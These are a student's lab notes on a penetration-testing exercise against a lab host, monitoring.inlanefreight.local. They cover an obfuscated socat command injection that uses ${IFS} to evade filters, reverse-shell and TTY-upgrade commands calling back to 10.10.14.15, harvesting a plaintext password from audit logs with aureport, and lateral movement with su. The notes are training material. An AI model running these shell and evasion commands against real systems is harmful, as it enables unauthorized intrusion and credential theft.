
2026-06-11 09:45

Tags: 

## Establishing a Reverse Shell

- After bypassing command injection filters on the `monitoring.inlanefreight.local` application, the next step is to catch a reverse shell.
	- **The Payload:** The attacker injects a carefully crafted `socat` command into an HTTP GET request, using character quoting and `${IFS}` to bypass space filters (e.g., `'s'o'c'a't'${IFS}TCP4:10.10.14.15:8443...`).
		- ![[Pasted image 20260611095820.png]]
		-  ![[Pasted image 20260611095855.png]]
		    
	- **The Catch:** A standard Netcat listener (`nc -nvlp 8443`) is used to catch the incoming connection, resulting in a basic shell as the `webdev` user.
		- ![[Pasted image 20260611104203.png]]

## Upgrading to an Interactive TTY

- A basic shell limits functionality (no command completion, text editors, or `su`/`ssh` execution). Instead of using the traditional Python `pty` trick, the lecture demonstrates a `socat` upgrade for a fully featured terminal.
	- **Attacker Host:** Start a `socat` listener that passes raw TTY data: `socat file:'tty',raw,echo=0 tcp-listen:4443`
		- ![[Pasted image 20260611104523.png]]
		    
	- **Target Host:** Execute a `socat` command to connect back and spawn a pseudo-terminal: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443`
		- ![[Pasted image 20260611104551.png]]
		- ![[Pasted image 20260611104602.png]]

## Enumeration and Credential Harvesting

- With a stable shell, local enumeration begins by checking the current user's privileges.
	- **The Findings:** Running the `id` command reveals the `webdev` user is part of the **`adm` group**.
		- ![[Pasted image 20260611104724.png]]
		    
	- **The Exploit:** Members of the `adm` group typically have read access to all system logs in `/var/log`. The attacker uses the `aureport --tty` command to read Linux audit system logs.
		- ![[Pasted image 20260611104737.png]]
		    
	- **The Loot:** The audit logs expose keystrokes from a previous session where a user typed out a password in plain text, yielding the credential pair `srvadm:ILFreightnixadm!`.

## Lateral Movement

- Using the discovered password and the fully interactive TTY, the attacker successfully uses the `su srvadm` command to switch accounts and authenticate as the `srvadm` user, successfully moving laterally across the machine.
	- ![[Pasted image 20260611104758.png]]

- **Next Steps:** The lecture notes that the immediate priority moving forward will be to escalate privileges to root and establish persistence to ensure access to the host is not lost.
## References:

